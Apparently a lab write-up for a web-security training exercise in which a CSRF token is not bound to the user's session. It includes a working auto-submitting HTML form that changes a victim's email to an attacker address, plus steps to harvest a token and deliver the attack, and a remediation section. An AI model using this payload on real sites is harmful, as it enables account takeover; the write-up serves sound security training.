#  CSRF Where Token is Not Tied to User Session

##  Lab Description
This lab demonstrates a flawed CSRF protection mechanism. While the application requires a valid CSRF token, it fails to verify that the token belongs to the active session. It maintains a global pool of tokens and accepts any valid token found in its database, regardless of which user generated it.

##  Objective
Perform a CSRF attack to change the victim's email address. To bypass the protection, i will obtain a valid CSRF token from our own account (attacker) and feed it to the victim.

##  The Vulnerability (The "Cinema Ticket" Flaw)
Ideally, a CSRF token should be cryptographically bound to the user's session ID.
* **Correct Logic:** `if (Token_Received == Token_In_User_Session)`
* **Flawed Logic:** `if (Token_Received exists in Token_Database)`

Because of this flaw, an attacker can log in with their own account, generate a valid token, and use that token in a forged request for the victim. The server sees a valid token and processes the request.

## 💣 The Exploit Payload

I create an auto-submitting HTML form. This time, i **include** the CSRF parameter, but i populate it with a token obtained from the attacker's account.

```html
<form method="POST" action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="INSERT_ATTACKER_TOKEN_HERE">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Steps to Reproduce
1. Harvest a Token:

* Open the lab and log in with the attacker's credentials (wiener:peter).

* Navigate to the "Update Email" page.

* Inspect the page source or intercept the request in Burp Suite to find the csrf token value.

* Copy this token. (e.g., S9a8B7...).

Craft the Exploit:

2. Go to the Exploit Server.

* Paste the payload code into the Body section.

* Replace YOUR-LAB-ID with the lab's URL.

* Replace INSERT_ATTACKER_TOKEN_HERE with the token you copied in Step 1.

3. Deliver the Attack:

* Click Store.

* Click Deliver to victim.

The victim's browser will submit the form using your token. The server will validate the token (since it's a real token from the system) and update the victim's email.

## Remediation
To fix this, the server must validate that the submitted CSRF token matches the token associated with the current user's session. Simply checking if a token exists in the database is insufficient.